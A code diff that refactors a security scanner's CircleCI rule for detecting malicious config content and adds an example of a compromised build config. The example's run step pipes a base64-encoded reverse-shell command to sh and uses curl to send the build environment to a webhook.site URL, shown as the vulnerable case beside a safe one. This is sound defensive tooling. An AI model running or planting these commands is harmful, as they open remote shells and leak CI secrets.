@@ -1,10 +1,9 @@
 """CC-026, config contains evidence of malicious activity."""
 from __future__ import annotations
 
-from typing import Any
-
-from ..._malicious import find_malicious_patterns
-from ...base import Finding, Severity, blob_lower
+from ..._malicious import find_malicious_patterns, summarize_malicious_hits
+from ..._primitives.blob_rule import yaml_blob_check
+from ...base import Severity
 from ...rule import Rule
 
 RULE = Rule(
@@ -37,29 +36,42 @@ RULE = Rule(
         "MEDIUM`` to ignore all matches; the rule still surfaces the "
         "hit for teams that want to spot-check.",
     ),
+    exploit_example=(
+        "# Vulnerable: a step body pipes a base64-decoded payload\n"
+        "# to ``sh``. A malicious PR (or a compromised co-maintainer)\n"
+        "# plants the reverse-shell loader in the config itself;\n"
+        "# every subsequent build executes the payload.\n"
+        "version: 2.1\n"
+        "jobs:\n"
+        "  build:\n"
+        "    docker:\n"
+        "      - image: alpine@sha256:abc123...\n"
+        "    steps:\n"
+        "      - run: |\n"
+        "          echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | sh\n"
+        "          curl https://webhook.site/abc?env=$(env|base64)\n"
+        "\n"
+        "# Safe: the build does only what the build does. No\n"
+        "# obfuscated execution, no exfil POSTs, no ``base64\n"
+        "# -d | sh`` pipelines. If a check fires here it's\n"
+        "# either a compromise or a CTF fixture; treat as\n"
+        "# incident-response until verified otherwise.\n"
+        "version: 2.1\n"
+        "jobs:\n"
+        "  build:\n"
+        "    docker:\n"
+        "      - image: alpine@sha256:abc123...\n"
+        "    steps:\n"
+        "      - checkout\n"
+        "      - run: make build"
+    ),
 )
 
 
-def check(path: str, doc: dict[str, Any]) -> Finding:
-    hits = find_malicious_patterns(blob_lower(doc))
-    if not hits:
-        return Finding(
-            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
-            resource=path,
-            description="No indicators of malicious activity detected.",
-            recommendation="No action required.", passed=True,
-        )
-    categories = sorted({c for c, _n, _e in hits})
-    summary = "; ".join(
-        f"{name} ({excerpt!r})" for _cat, name, excerpt in hits[:3]
-    )
-    desc = (
-        f"{len(hits)} indicator(s) of malicious activity "
-        f"({', '.join(categories)}). Examples: {summary}"
-        f"{'...' if len(hits) > 3 else ''}."
-    )
-    return Finding(
-        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
-        resource=path, description=desc,
-        recommendation=RULE.recommendation, passed=False,
-    )
+check = yaml_blob_check(
+    RULE,
+    scanner=find_malicious_patterns,
+    pass_desc="No indicators of malicious activity detected.",
+    fail_desc=summarize_malicious_hits,
+    pass_recommendation="No action required.",
+)
